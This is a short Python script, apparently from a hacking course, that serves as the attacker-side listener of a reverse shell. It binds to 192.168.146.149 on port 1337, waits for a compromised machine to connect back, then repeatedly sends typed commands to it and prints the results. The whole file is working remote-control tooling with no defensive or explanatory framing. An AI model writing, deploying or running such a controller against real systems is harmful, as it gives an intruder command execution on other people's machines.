#!/user/bin/env python
import socket


listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.146.149", 1337))
listener.listen(0)
print("[+] Waiting for incoming connection.\n")
connection, address = listener.accept()
print("\n[+] Got a connection.\n", str(address))

while True:
    command = input(">> ")
    connection.send(command.encode("utf-8"))
    result = connection.recv(1024)
    print(result.decode("utf-8"))
